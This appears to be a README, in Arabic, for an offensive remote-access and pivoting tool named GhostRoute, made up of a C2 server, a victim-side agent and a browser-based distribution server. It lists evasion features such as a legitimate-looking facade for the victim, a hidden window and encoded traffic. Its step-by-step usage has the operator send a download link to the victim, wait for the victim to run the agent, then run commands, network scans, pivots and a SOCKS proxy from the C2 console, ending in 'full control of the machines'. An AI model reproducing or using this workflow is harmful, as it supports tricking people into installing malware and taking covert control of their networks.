# GhostRoute - Pivot + SOCKS Proxy Deployment

## المشكلة
الوصول للأجهزة الداخلية في الشبكات المعزولة دون اكتشاف.

## الفكرة
بناء أداة تحاكي التحرك الجانبي داخل الشبكات.

## الهدف
استخدام جهاز مخترق كوسيط للوصول لأجهزة أخرى.

## المكونات

| الملف | الوظيفة |
|:---|:---|
| ghost_server.py | الخادم الرئيسي (C2) |
| ghost_agent.py | العميل (يعمل على الضحية) |
| ghost_http_server.py | خادم التوزيع عبر المتصفح |

## الميزات

- تشفير الاتصالات (zlib + base64)
- واجهة شرعية للضحية
- إخفاء النافذة
- اتصال مستمر
- اكتشاف الشبكة
- توجيه (Pivot)
- نشر SOCKS Proxy
- توزيع عبر المتصفح
- واجهة CLI
- معالجة أخطاء
- تسجيل أحداث

## طريقة التشغيل

### 1. تشغيل خادم التوزيع:
python ghost_http_server.py --port 8080

### 2. إرسال الرابط للضحية:
http://<SERVER_IP>:8080

### 3. الضحية يحمل ويشغل الملف

### 4. تشغيل الخادم الرئيسي:
python ghost_server.py --port 4444

### 5. استخدام الأوامر:
ghost> help
ghost> agents
ghost> execute whoami
ghost> scan
ghost> pivot <ip> <port>
ghost> socks <port>

## النتائج

- تحكم كامل في الأجهزة
